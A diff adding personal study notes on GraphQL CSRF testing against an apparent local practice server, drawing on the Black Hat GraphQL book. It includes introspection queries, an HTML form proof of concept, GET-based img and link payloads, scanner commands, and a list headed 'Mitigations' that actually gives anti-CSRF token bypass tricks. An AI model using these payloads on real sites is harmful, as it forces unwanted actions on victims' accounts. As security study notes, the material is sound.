@@ -1,0 +1,95 @@
+
+CSRF - move to new txt file
+To find impactful CSRF vulnerabilities,
+try extracting the list of available mutations and searching for ones that
+give you a foothold in the application or allow you to escalate your existing
+privileges 
+1 Locate stage changing Actions
+query {
+    __schema {
+        mutationType {
+            fields {
+                name
+            }
+        }
+    }
+}
+
+When you don’t notice any sensitive actions, the next thing to
+look for is whether you can use queries to perform state-changing actions
+Get Based Queries exist in some servers, there is a mitigation to allow 
+only GET queries and reject mutations but if GET based state changing queries 
+exist, we can exploit 
+query {
+    __schema {
+        queryType {
+            fields {
+                name
+            }
+        }
+    }
+}
+
+Testing for POST-Based Vulnerabilities
+<html>
+    <h1>Click the button below to see the proof of concept!</h1>
+    <body>
+    <form id="auto_submit_form" method="POST" action="http://localhost:5013/graphql">
+        <input type="hidden" name="query" value="mutation { createPaste(title:&quot;CSRF&quot;,
+        content:&quot;content&quot;,
+        public:true, burn: false) { paste { id content title burn } }}"/>
+    <input type="submit" value="Submit">
+    </form>
+    </body>
+<html>
+
+PoC  https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch09/post_csrf_submit.html
+
+Testing for GET-Based Vulnerabilities
+To test whether a GraphQL server
+supports them, you could send a cURL command like this one:
+# curl -X GET "http://localhost:5013/graphql?query=mutation%20%7B%20__typename%20%7D"
+
+GET-based CSRF attacks are somewhat more interesting than POSTbased ones 
+because applications often won’t implement anti-CSRF protections on GET requests.
+
+<a href="http://localhost:5013/graphql?query=mutation{someSensitiveAction}" />
+<img src="http://localhost:5013/graphql?query=mutation{someSensitiveAction}" />
+
+https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch09/get_csrf_submit_auto.html
+
+Using HTML Injection
+A second way we could exploit GET-based CSRF is by abusing another vulnerability, such as HTML injection, which allows an attacker to inject HTML
+tags into a web page.
+
+Automating Testing with BatchQL and GraphQL Cop
+python3 batch.py -e http://localhost:5013/graphql | grep -i CSRF
+GraphQL Cop is similar to BatchQL in the way it tests for CSRF vulnerabilities, 
+except it additionally tests whether the server supports mutations over GET
+python3 graphql-cop.py -t http://localhost:5013/graphql | grep -i CSRF
+
+Prevention
+SameSite Cookie 
+Anti-CSRF Tokens
+Mitigations 
+- Removing the CSRF token value. Some anti-CSRF implementations
+may fail when a CSRF parameter exists but no value is set, resulting in a
+null value.
+
+•  Removing the CSRF parameter and token value altogether. Some antiCSRF
+ implementations may fail when the parameter is not set.
+
+•  Reusing a CSRF token in subsequent requests. If an attacker can 
+capture one valid anti-CSRF token, such as one belonging to their own session, 
+and the server doesn’t invalidate already-used tokens, it’s possible
+to reuse that token in CSRF attacks.
+
+•  Replacing the CSRF token with a random string of the same character
+length. Some servers may simply look at the token value and check its
+length. If the length is equal to that of a normal token (for example,
+14 characters), they may let the request go through.
+
+•  Brute-forcing the CSRF token. Some CSRF tokens may be cryptographically weak, 
+allowing an attacker to brute-force them. For example, they
+might be short in length, use a predictable pattern, or employ a weak
+cryptographic algorithm.
